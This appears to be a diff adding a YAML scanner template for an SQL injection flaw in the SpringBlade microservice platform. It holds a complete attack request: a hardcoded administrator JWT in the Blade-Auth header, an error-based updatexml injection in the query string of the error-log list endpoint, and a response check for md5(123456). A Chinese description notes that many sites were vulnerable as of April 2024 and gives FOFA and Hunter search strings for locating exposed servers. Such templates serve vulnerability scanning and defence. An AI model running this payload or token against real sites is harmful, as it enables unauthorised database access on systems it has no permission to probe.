@@ -1,0 +1,18 @@
+name: SpringBlade-sqli         
+rules: 
+  - method: GET               
+    headers: 
+      Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
+    path: /api/blade-log/error/list?updatexml(1,concat(0x7e,md5(123456),0x7e),1)=1
+    body:                  
+    expression:                        
+      status_code: 500                 
+      response_header:              
+      response_body: e10adc3949ba59a       #md5(123456)的前几个值               
+detail:                           
+  description: "SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.5 、Spring Cloud 2020 等核心技术构建，完全遵循阿里巴巴编码规范，提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。   
+  SpringBlade list接口存在SQL注入漏洞,截至到2024.4.15存在该漏洞的网站较多。"
+  search:             
+    fofa: body="https://bladex.vip"
+    鹰图: web.body="https://bladex.vip"
+    
